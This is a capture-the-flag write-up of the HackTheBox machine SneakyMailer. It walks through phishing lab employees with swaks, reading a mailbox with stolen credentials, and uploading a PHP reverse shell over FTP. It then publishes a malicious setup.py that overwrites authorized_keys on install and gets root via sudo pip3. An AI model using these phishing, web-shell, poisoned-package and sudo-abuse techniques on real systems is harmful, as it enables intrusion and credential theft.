</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>Visiting <code>sneakycorp.htb</code> on port 80 displays a project dashboard for a company called SneakyCorp. One project is marked as &ldquo;Complete!&rdquo; while the other one seems still in progress for about 80%.</p><p><div class=img-container><img src=imgs/7f7b01dbdf744b97b9ccc3c260288ee1.png alt></div></p><p>Clicking on the &ldquo;Team&rdquo; menu points to<code>/team.php</code>. This page shows a table contains the employees&rsquo; data of SneakyCorp.</p><p><div class=img-container><img src=imgs/1a6090141fa446bd88cf25781913b8d5.png alt></div></p><p>I saved the whole table data and stored it in a file called <code>team</code>.</p><p><div class=img-container><img src=imgs/c3c89ffbc8854cf1abf6ebece09b0197.png alt></div></p><p>I can grab the emails using the <code>grep</code> and <code>tr</code> command as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class=line><span class=cl>$ cat team <span class=p>|</span> egrep -o <span class=s2>&#34;[^[:space:]]+@[^[:space:]]+&#34;</span> <span class=p>|</span> tr -d <span class=s2>&#34;&lt;&gt;&#34;</span> <span class=p>|</span> tee emails.list
</span></span></code></pre></div><p><div class=img-container><img src=imgs/612596863de94710b3a4ed80fd375133.png alt></div></p><p>I ran <code>gobuster</code> but it didn&rsquo;t show any interesting results.</p><h3 id=tcp-8080--website>TCP 8080 —  Website<a class=anchor aria-hidden=true href=#tcp-8080--website>#</a></h3><p>It returns the default Nginx page.</p><h3 id=tcp-25--smtp-mail>TCP 25  —  SMTP (Mail)<a class=anchor aria-hidden=true href=#tcp-25--smtp-mail>#</a></h3><p>I tried to send an email, and it got queued.</p><p><div class=img-container><img src=imgs/4b5e0238399640bd9b40a2810102ce39.png alt></div></p><p>Given a list of email addresses, the box title, as well as the illustration, I can guess it has something to do with email phishing.</p><h4 id=email-phishing>Email Phishing<a class=anchor aria-hidden=true href=#email-phishing>#</a></h4><p>I&rsquo;ll setup <code>netcat</code> listener on port 80, and then I&rsquo;ll use a tool called <code>swaks</code> to send an email containing my IP address to all the email addresses I&rsquo;ve got.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class=line><span class=cl>$ swaks --server <span class=s1>&#39;10.10.10.197&#39;</span> --to <span class=sb>`</span>cat emails.list <span class=p>|</span> tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39;,&#39;</span><span class=sb>`</span> --from admin@sneakymailer.htb --body <span class=s2>&#34;http://10.10.14.42/&#34;</span>
</span></span></code></pre></div><p>And there is an HTTP POST request coming to my listener.</p><p><div class=img-container><img src=imgs/330df9a36349481fb8d7cef7660c535e.png alt></div></p><p>The request body contains this data.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</span></span></span></code></pre></div><p>It can be decoded using an online url decoder.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd@sneakymailer.htb&amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
</span></span></span></code></pre></div><p>The parameter <code>password</code> and <code>rpassword</code> seem juicy where the <strong>r</strong> might refer to reset or retype the password. Unfortunately, the password doesn&rsquo;t work on SSH and FTP.</p><h3 id=tcp-143---imap>TCP 143 - IMAP<a class=anchor aria-hidden=true href=#tcp-143---imap>#</a></h3><p>With the obtained credentials, I can try to use it on IMAP, but since Kali doesn’t have any builtin mail apps, I&rsquo;ll need an email client, and I end up with <a href=https://sylpheed.sraoss.jp/en/>sylpheed</a>. You can install it with <code>sudo apt-get install sylpheed</code>.</p><p>But before moving on, I&rsquo;ll add <code>sneakymailer.htb</code> to my<code>/etc/hosts</code> file to avoid problems with dns/name resolution.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;10.10.10.197 sneakymailer.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h4 id=initial-setup>Initial Setup<a class=anchor aria-hidden=true href=#initial-setup>#</a></h4><p>As this is my first install, I&rsquo;ll have to determine the location of the mailbox (storage) for receiving email from the mail server. I decided to put it on<code>/root/sneaky/loot/Mail</code>.</p><p><div class=img-container><img src=imgs/336c2c9d596e4a86ba1ce454e912b2d9.png alt></div></p><p>Next I&rsquo;ll have to determine the account type. Because the box only has IMAP listening and we&rsquo;re not going outside VPN connection, then I should choose IMAP4.</p><p><div class=img-container><img src=imgs/aaa3354fe43a4564b1b13aec5c14a83c.png alt></div></p><p>In the following section, I&rsquo;ll use the display name Paul and the email address <code>paulbyrd@sneakymailer.htb</code> that I obtained through phishing.</p><p><div class=img-container><img src=imgs/3361aa3232224c8890c857f9e913becc.png alt></div></p><p>I lost some of my screenshots after the step above, but here is the final configuration.</p><p><div class=img-container><img src=imgs/8ded1188afee41fd852d14e4943fc9b4.png alt></div></p><p>Lastly, enter <code>paulbyrd</code>&rsquo;s password, <code>^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code>, if the app asks for it after applying the configuration. Now wait until it fetches all the emails from the server.</p><h4 id=retrieving-the-emails>Retrieving the emails<a class=anchor aria-hidden=true href=#retrieving-the-emails>#</a></h4><p>In Paul&rsquo;s mailbox, I found two emails inside the &ldquo;Sent Items&rdquo; folder.</p><p>The first email was sent with the subject of &ldquo;Password Reset&rdquo;. In this email, Paul asks the administrator to change the developer account password. I&rsquo;ll grab the credentials of the developer account.</p><p><div class=img-container><img src=imgs/540344afea7f42debd7cdc36f3fadd32.png alt></div></p><p>The second email was sent with the subject &ldquo;Module testing&rdquo;, but right now I&rsquo;m not sure what it is about.</p><p><div class=img-container><img src=imgs/f11b8bd4b2934eb892f681d23a369cdd-1619628769041.png alt></div></p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-www-data>Shell as www-data<a class=anchor aria-hidden=true href=#shell-as-www-data>#</a></h3><h4 id=ftp-access>FTP Access<a class=anchor aria-hidden=true href=#ftp-access>#</a></h4><p>The developer account can be used to access the FTP server. There is only one directory called<code>/dev</code> in the FTP root directory.</p><p><div class=img-container><img src=imgs/f761f7b9b264477ebae8d690c347cbef.png alt></div></p><p>I access the FTP server via browser. The files inside this FTP look the same files as the one hosted on <code>sneakycorp.htb</code>, except it has the additional word &ldquo;dev&rdquo; in the title.</p><p><div class=img-container><img src=imgs/cea046ccdffc4e0f83620407c53726d5.png alt></div></p><h4 id=reverse-shell-via-ftp-upload>Reverse Shell via FTP Upload<a class=anchor aria-hidden=true href=#reverse-shell-via-ftp-upload>#</a></h4><p>It turns out that the developer account has write permission on the <code>/dev</code> directory, so I can drop a PHP reverse shell payload there.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>211-FTP server status:
</span></span><span class=line><span class=cl>     Connected to ::ffff:10.10.14.20
</span></span><span class=line><span class=cl>     Logged in as developer
</span></span><span class=line><span class=cl>     TYPE: ASCII
</span></span><span class=line><span class=cl>     No session bandwidth limit
</span></span><span class=line><span class=cl>     Session timeout in seconds is <span class=m>300</span>
</span></span><span class=line><span class=cl>     Control connection is plain text
</span></span><span class=line><span class=cl>     Data connections will be plain text
</span></span><span class=line><span class=cl>     At session startup, client count was <span class=m>1</span>
</span></span><span class=line><span class=cl>     vsFTPd 3.0.3 - secure, fast, stable
</span></span><span class=line><span class=cl>ftp&gt; <span class=nb>cd</span> /dev
</span></span><span class=line><span class=cl><span class=m>250</span> Directory successfully changed.
</span></span><span class=line><span class=cl>ftp&gt; put /shares/reversef.php iamf.php
</span></span><span class=line><span class=cl>local: /shares/reversef.php remote: iamf.php
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful. Consider using PASV.
</span></span><span class=line><span class=cl><span class=m>150</span> Ok to send data.
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
</span></span><span class=line><span class=cl><span class=m>72</span> bytes sent in 0.00 secs <span class=o>(</span>2.8610 MB/s<span class=o>)</span>
</span></span></code></pre></div><p>The uploaded web shell is available on <code>http://dev.sneakycorp.htb/iamf.php</code>. I will add <code>dev.sneakycorp.htb</code> to my <code>/etc/hosts</code> first.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;10.10.10.194&#39;</span> &gt;&gt; dev.sneakycorp.htb
</span></span></code></pre></div><p>Now I can trigger my web shell with curl.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class=line><span class=cl>$ curl -s http://dev.sneakycorp.htb/iamf.php
</span></span></code></pre></div><p>My listener has an interactive shell now.</p><p><div class=img-container><img src=imgs/43276abaf55b4760822901631d8c21de.png alt></div></p><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-low>Shell as low<a class=anchor aria-hidden=true href=#shell-as-low>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>In <code>/var/www</code>, I found another subdomain. The new is <code>pypi.sneakycorp.htb</code>, I&rsquo;ll add it to my <code>/etc/hosts</code> file.</p><p><div class=img-container><img src=imgs/image-20210429003013735.png alt></div></p><p>I discovered <code>.htpasswd</code> file inside <code>pypi.sneakycorp.htb</code>, which contains PyPI credentials.</p><p><div class=img-container><img src=imgs/image-20210429003321320.png alt></div></p><p>I&rsquo;ll save <code>pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</code> to my note and send it to my Windows for cracking. In <code>/home</code> there is no user called <code>pypi</code>, so it might be used for something else.</p><h4 id=cracking-password>Cracking Password<a class=anchor aria-hidden=true href=#cracking-password>#</a></h4><p>The password can be cracked easily with John the Ripper.</p><p><div class=img-container><img src=imgs/image-20210429003613068.png alt></div></p><p>The password is <code>soufianeelhaoui</code></p><h4 id=malicious-pypi-package>Malicious PyPI package<a class=anchor aria-hidden=true href=#malicious-pypi-package>#</a></h4><p>Looking at the web configuration file, there is another domain <code>pypi.sneakycorp.htb</code> which is accessible on <code>localhost:5000</code>.</p><p><div class=img-container><img src=imgs/image-20210429005849918.png alt></div></p><p>It also accessible from remote on port 8080 if I specify the hostname, <code>pypi.sneakycorp.htb</code>.</p><p><div class=img-container><img src=imgs/image-20210429005829551.png alt></div></p><p>Based on the second email that Paul sent to user law.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Hello low
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Your current task is to install, test and then erase every python module you 
</span></span><span class=line><span class=cl>find in our PyPI service, let me know if you have any inconvenience.
</span></span></code></pre></div><p>The idea is that I can create my own PyPI package, of course a malicious one, upload it (via local or remote), and then let user <code>low</code> install the package (configured by the box&rsquo;s author automatically).</p><p>To create a package, I&rsquo;ll use the official site tutorial as my reference:</p><ul><li><a href=https://packaging.python.org/tutorials/packaging-projects/>https://packaging.python.org/tutorials/packaging-projects/</a></li><li>And you might want to read this too, <a href=https://packaging.python.org/specifications/pypirc/>https://packaging.python.org/specifications/pypirc/</a></li></ul><p>First, I&rsquo;ll get the <code>setup.py</code> template which looks like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>setuptools</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;README.md&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>fh</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>long_description</span> <span class=o>=</span> <span class=n>fh</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>setuptools</span><span class=o>.</span><span class=n>setup</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>name</span><span class=o>=</span><span class=s2>&#34;example-pkg-YOUR-USERNAME-HERE&#34;</span><span class=p>,</span> <span class=c1># Replace with your own username</span>
</span></span><span class=line><span class=cl>    <span class=n>version</span><span class=o>=</span><span class=s2>&#34;0.0.1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>author</span><span class=o>=</span><span class=s2>&#34;Example Author&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>author_email</span><span class=o>=</span><span class=s2>&#34;author@example.com&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>description</span><span class=o>=</span><span class=s2>&#34;A small example package&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>long_description</span><span class=o>=</span><span class=n>long_description</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>long_description_content_type</span><span class=o>=</span><span class=s2>&#34;text/markdown&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span><span class=o>=</span><span class=s2>&#34;https://github.com/pypa/sampleproject&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>project_urls</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Bug Tracker&#34;</span><span class=p>:</span> <span class=s2>&#34;https://github.com/pypa/sampleproject/issues&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=n>classifiers</span><span class=o>=</span><span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Programming Language :: Python :: 3&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;License :: OSI Approved :: MIT License&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Operating System :: OS Independent&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=n>package_dir</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;&#34;</span><span class=p>:</span> <span class=s2>&#34;src&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=n>packages</span><span class=o>=</span><span class=n>setuptools</span><span class=o>.</span><span class=n>find_packages</span><span class=p>(</span><span class=n>where</span><span class=o>=</span><span class=s2>&#34;src&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=n>python_requires</span><span class=o>=</span><span class=s2>&#34;&gt;=3.6&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span></code></pre></div><p>My goal is only to insert my SSH public key to <code>low</code>&rsquo;s authorized_keys, so I&rsquo;ll need to modify the code to this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>setuptools</span>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;/home/low/.ssh/authorized_keys&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINtXqxDD334hQ3aaabbbssssdd&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl><span class=n>setuptools</span><span class=o>.</span><span class=n>setup</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>name</span><span class=o>=</span><span class=s2>&#34;low&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>version</span><span class=o>=</span><span class=s2>&#34;0.0.1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>author</span><span class=o>=</span><span class=s2>&#34;Example Author&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>author_email</span><span class=o>=</span><span class=s2>&#34;author@example.com&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>description</span><span class=o>=</span><span class=s2>&#34;A small example package&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>long_description</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>long_description_content_type</span><span class=o>=</span><span class=s2>&#34;text/markdown&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>     <span class=n>url</span><span class=o>=</span><span class=s2>&#34;https://github.com/pypa/sampleproject&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>     <span class=n>packages</span><span class=o>=</span><span class=n>setuptools</span><span class=o>.</span><span class=n>find_packages</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>     <span class=n>classifiers</span><span class=o>=</span><span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Programming Language :: Python :: 3&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;License :: OSI Approved :: MIT License&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Operating System :: OS Independent&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>     <span class=p>],</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span></code></pre></div><p>From the link above, in order to upload a package to the PyPI server, a file called <code>.pypirc</code> must be present at <code>$HOME/.pypirc</code>.</p><p>The file is required for authentication, so I&rsquo;ll create one and put the PyPI credentials I obtained before.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>[distutils]
</span></span><span class=line><span class=cl>index-servers =
</span></span><span class=line><span class=cl> local
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>[local]
</span></span><span class=line><span class=cl>repository: http://127.0.0.1:5000
</span></span><span class=line><span class=cl>username: pypi
</span></span><span class=line><span class=cl>password: soufianeelhaoui
</span></span></code></pre></div><p>If I wanted to upload remotely, my <code>.pypirc</code> would look like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>[distutils]
</span></span><span class=line><span class=cl>index-servers =
</span></span><span class=line><span class=cl> remote
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>[remote]
</span></span><span class=line><span class=cl>repository: http://pypi.sneakycorp.htb:8080
</span></span><span class=line><span class=cl>username: pypi
</span></span><span class=line><span class=cl>password: soufianeelhaoui
</span></span></code></pre></div><p>I&rsquo;ll transfer <code>setup.py</code> and <code>.pypirc</code> to <code>/dev/shm</code> of SneakyMailer via Python http server.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «exploits» «10.10.14.42» 
</span></span><span class=line><span class=cl>$ python3 -m http.server <span class=m>80</span>
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>80</span> <span class=o>(</span>http://0.0.0.0:80/<span class=o>)</span> ...
</span></span><span class=line><span class=cl>10.10.10.197 - - <span class=o>[</span>12/Jul/2020  08:24:12<span class=o>]</span> <span class=s2>&#34;GET /.pypirc HTTP/1.1&#34;</span> <span class=m>200</span> -
</span></span><span class=line><span class=cl>10.10.10.197 - - <span class=o>[</span>12/Jul/2020  08:24:29<span class=o>]</span> <span class=s2>&#34;GET /setup.py HTTP/1.1&#34;</span> <span class=m>200</span> -
</span></span></code></pre></div><p>On SneakyMailer:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/.pypirc &gt; .pypirc
</span></span><span class=line><span class=cl>www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/setup.py &gt; setup.py
</span></span></code></pre></div><p>Now at <code>/dev/shm</code>, the folder structure looks like this.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>├── .pypirc
</span></span><span class=line><span class=cl>├── iamf.php
</span></span><span class=line><span class=cl>└── setup.py
</span></span></code></pre></div><p>The last part is set <code>$HOME</code> to <code>/dev/shm</code>, because <code>.pypirc</code> should be placed at <code>$HOME/.pypirc</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@sneakymailer:/dev/shm$ <span class=nb>export</span> <span class=nv>$HOME</span><span class=o>=</span>/dev/shm
</span></span></code></pre></div><p>After all is set, I can start uploading the malicious package I made to the PyPI server locally using the command below.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@sneakymailer:~$ python3 setup.py sdist upload -r <span class=nb>local</span>
</span></span><span class=line><span class=cl>running sdist
</span></span><span class=line><span class=cl>running egg_info
</span></span><span class=line><span class=cl>writing low.egg-info/PKG-INFO
</span></span><span class=line><span class=cl>writing dependency_links to low.egg-info/dependency_links.txt
</span></span><span class=line><span class=cl>writing top-level names to low.egg-info/top_level.txt
</span></span><span class=line><span class=cl>reading manifest file <span class=s1>&#39;low.egg-info/SOURCES.txt&#39;</span>
</span></span><span class=line><span class=cl>writing manifest file <span class=s1>&#39;low.egg-info/SOURCES.txt&#39;</span>
</span></span><span class=line><span class=cl>warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md
</span></span><span class=line><span class=cl>running check
</span></span><span class=line><span class=cl>creating low-0.0.1
</span></span><span class=line><span class=cl>creating low-0.0.1/low.egg-info
</span></span><span class=line><span class=cl>copying files to low-0.0.1…
</span></span><span class=line><span class=cl>copying setup.py -&gt; low-0.0.1
</span></span><span class=line><span class=cl>copying low.egg-info/PKG-INFO -&gt; low-0.0.1/low.egg-info
</span></span><span class=line><span class=cl>copying low.egg-info/SOURCES.txt -&gt; low-0.0.1/low.egg-info
</span></span><span class=line><span class=cl>copying low.egg-info/dependency_links.txt -&gt; low-0.0.1/low.egg-info
</span></span><span class=line><span class=cl>copying low.egg-info/top_level.txt -&gt; low-0.0.1/low.egg-info
</span></span><span class=line><span class=cl>Writing low-0.0.1/setup.cfg
</span></span><span class=line><span class=cl>Creating tar archive
</span></span><span class=line><span class=cl>removing <span class=s1>&#39;low-0.0.1&#39;</span> <span class=o>(</span>and everything under it<span class=o>)</span>
</span></span><span class=line><span class=cl>running upload
</span></span><span class=line><span class=cl>Submitting dist/low-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
</span></span><span class=line><span class=cl>Server response <span class=o>(</span>200<span class=o>)</span>: OK
</span></span><span class=line><span class=cl>WARNING: Uploading via this <span class=nb>command</span> is deprecated, use twine to upload instead <span class=o>(</span>https://pypi.org/p/twine/<span class=o>)</span>
</span></span></code></pre></div><p>As long as I see the server response is 200, that means I have successfully uploaded the package.</p><h4 id=ssh-access>SSH Access<a class=anchor aria-hidden=true href=#ssh-access>#</a></h4><p>Now I can login with my private key as user <code>low</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class=line><span class=cl>$ ssh -i id_ecdsa low@10.10.10.197
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210429021145269.png alt></div></p><p>User flag is done here.</p><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=abusing-sudo-pip>Abusing sudo pip<a class=anchor aria-hidden=true href=#abusing-sudo-pip>#</a></h4><p>User <code>low</code> has sudo privileges on <code>/usr/bin/pip3</code>.</p><p><div class=img-container><img src=imgs/image-20210429021533891.png alt></div></p><p>I&rsquo;ll follow the instruction from <a href=https://gtfobins.github.io/gtfobins/pip/>GTFOBins</a> to abuse this circumstance to obtain the root flag.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>low@sneakymailer:~$ <span class=nv>TF</span><span class=o>=</span><span class=k>$(</span>mktemp -d<span class=k>)</span>
</span></span><span class=line><span class=cl>low@sneakymailer:~$
</span></span><span class=line><span class=cl>low@sneakymailer:~$ <span class=nb>echo</span> <span class=s1>&#39;raise Exception(open(&#34;/root/root.txt&#34;).read())&#39;</span> &gt; <span class=nv>$TF</span>/setup.py
</span></span><span class=line><span class=cl>low@sneakymailer:~$
</span></span><span class=line><span class=cl>low@sneakymailer:~$ sudo pip3 install <span class=nv>$TF</span>
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210429021914961.png alt></div></p><p>Or to get a shell as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>low@sneakymailer:~$ <span class=nv>TF</span><span class=o>=</span><span class=k>$(</span>mktemp -d<span class=k>)</span>
</span></span><span class=line><span class=cl>low@sneakymailer:~$
</span></span><span class=line><span class=cl>low@sneakymailer:~$ <span class=nb>echo</span> <span class=s2>&#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;</span><span class=k>$(</span>tty<span class=k>)</span><span class=s2> &gt;</span><span class=k>$(</span>tty<span class=k>)</span><span class=s2> 2&gt;</span><span class=k>$(</span>tty<span class=k>)</span><span class=s2>&#39;)&#34;</span> &gt; <span class=nv>$TF</span>/setup.py
</span></span><span class=line><span class=cl>low@sneakymailer:~$
</span></span><span class=line><span class=cl>low@sneakymailer:~$ sudo pip3 install <span class=nv>$TF</span>
</span></span><span class=line><span class=cl>sudo: Unable to resolve host sneakymailer: Temporary failure in name resolution
</span></span><span class=line><span class=cl>Processing /tmp/tmp.9ShSegy5bm
</span></span><span class=line><span class=cl><span class=c1># whoami</span>
</span></span><span class=line><span class=cl>root
</span></span><span class=line><span class=cl><span class=c1># id</span>
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span></code></pre></div><div class=post-references><h2>References</h2><ul><li><a href=https://sylpheed.sraoss.jp/ target=_blank rel="noopener noreferrer">https://sylpheed.sraoss.jp/</a></li><li><a href=https://packaging.python.org/tutorials/packaging-projects/ target=_blank rel="noopener noreferrer">https://packaging.python.org/tutorials/packaging-projects/</a></li></ul></div></div></div><div class=post-meta-bottom><span class=post-origin>Originally published at&nbsp;<a href=https://fahmifj.medium.com/hack-the-box-sneakymailer-10-10-10-197-scratch-cde6f3d21637 target=_blank rel="noopener noreferrer">fahmifj.medium.com</a></span></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/smtp/>SMTP</a></li><li><a href=https://fahmifj.github.io/tags/imap/>IMAP</a></li><li><a href=https://fahmifj.github.io/tags/sylpheed/>Sylpheed</a></li><li><a href=https://fahmifj.github.io/tags/phishing/>Phishing</a></li><li><a href=https://fahmifj.github.io/tags/webshell/>Webshell</a></li><li><a href=https://fahmifj.github.io/tags/python/>Python</a></li><li><a href=https://fahmifj.github.io/tags/pypi/>PyPI</a></li><li><a href=https://fahmifj.github.io/tags/sudo/>sudo</a></li><li><a href=https://fahmifj.github.io/tags/gtfobins/>GTFOBins</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - SneakyMailer on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20SneakyMailer&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsneakymailer%2f&hashtags=Linux%2cSMTP%2cIMAP%2cSylpheed%2cPhishing%2cWebshell%2cPython%2cPyPI%2csudo%2cGTFObins"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 